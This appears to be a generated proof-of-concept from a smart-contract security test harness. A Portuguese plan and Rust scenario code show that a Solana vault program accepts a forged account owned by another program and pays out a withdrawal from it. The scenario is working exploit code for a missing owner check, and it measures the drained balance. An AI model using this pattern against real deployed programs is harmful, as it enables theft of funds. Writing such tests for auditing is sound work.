{
  "plan": "O cenário monta um vault legítimo com owner do programa e dados contendo a autoridade e um saldo, e uma conta forjada com o mesmo layout mas owner de outro programa. O baseline executa um saque legítimo do vault real, provando que o cenário está correto. O ataque passa a conta forjada como vault, com a autoridade correta e saldo alto, e o mesmo recipient. O efeito mede que a conta forjada teve seu saldo decrementado e o recipient recebeu lamports, demonstrando que o programa aceitou dados de uma conta com owner diferente.",
  "scenario": "let program_id = env.program_id;
let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

// Vault legítimo: owner é o programa, dados: [discriminador? não, layout pinocchio: 8 bytes iniciais ignorados, depois authority (32), depois saldo (8)]
let mut vault_data = vec![0u8; 48];
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
let vault_legit = account(&program_id, &vault_data, Some(2000));

// Conta forjada: mesmo layout, mas owner é outro programa (System Program)
let mut forged_data = vec![0u8; 48];
forged_data[8..40].copy_from_slice(authority.as_ref());
forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
let forged_vault = account(&solana_sdk::system_program::id(), &forged_data, Some(2000));

let recipient_account = wallet(0);

// Baseline: saque legítimo do vault real
let ix_data = [0u8, 100u64.to_le_bytes()].concat();
let metas = vec![
    AccountMeta::new(vault_legit.key(), false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let ix = env.raw_ix(&ix_data, metas);
let contas = vec![
    (vault_legit.key(), vault_legit.clone()),
    (authority, account(&solana_sdk::system_program::id(), &[], None)), // authority não precisa de dados, só assinatura
    (recipient, recipient_account.clone()),
];
let baseline_result = env.baseline("saque legítimo do vault real", &ix, &contas);

// Ataque: mesma instrução, mas vault é a conta forjada com owner diferente
let attack_metas = vec![
    AccountMeta::new(forged_vault.key(), false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let attack_ix = env.raw_ix(&ix_data, attack_metas);
let attack_contas = vec![
    (forged_vault.key(), forged_vault.clone()),
    (authority, account(&solana_sdk::system_program::id(), &[], None)),
    (recipient, recipient_account.clone()),
];
let attack_result = env.attack("saque usando vault forjado com owner diferente", &attack_ix, &attack_contas);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &forged_vault.key());
    let recipient_after = after(&attack_result, &recipient);
    let forged_balance = read_u64(forged_after.data(), 40);
    let recipient_lamports = recipient_after.lamports();
    env.effect("saldo do vault forjado foi decrementado", forged_balance == 900);
    env.effect("recipient recebeu lamports do vault forjado", recipient_lamports == 100);
}"
}

